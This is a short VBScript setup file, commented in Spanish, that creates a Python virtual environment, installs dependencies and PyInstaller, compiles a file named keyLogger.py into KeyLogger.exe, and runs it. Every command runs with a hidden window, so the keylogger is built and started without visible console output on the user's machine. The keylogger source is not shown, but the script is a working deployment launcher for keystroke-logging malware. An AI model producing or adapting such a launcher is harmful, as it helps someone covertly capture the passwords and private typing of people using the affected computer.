' setup.vbs
' Crea y activa un entorno virtual e instala las dependencias

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject") ' Add this line to create the objFSO object

' Crear el entorno virtual
objShell.Run "cmd /c python -m venv env", 0, True

' Activar el entorno virtual
objShell.Run "cmd /c env\Scripts\activate.bat && pip install -r requirements.txt && pip install pyinstaller", 0, True

' Verificar si el archivo KeyLogger.exe existe
If Not objFSO.FileExists("KeyLogger.exe") Then
    ' Compilar el archivo keyLogger.py
    objShell.Run "cmd /c env\Scripts\activate.bat && pyinstaller --onefile keyLogger.py", 0, True

    ' Copia el archivo KeyLogger.exe que esta en el directorio dist y lo mueve al directorio raiz del proyecto
    objShell.Run "cmd /c copy dist\KeyLogger.exe .", 0, True
End If

' Ejecuta el .exe
objShell.Run "cmd /c KeyLogger.exe", 0, True
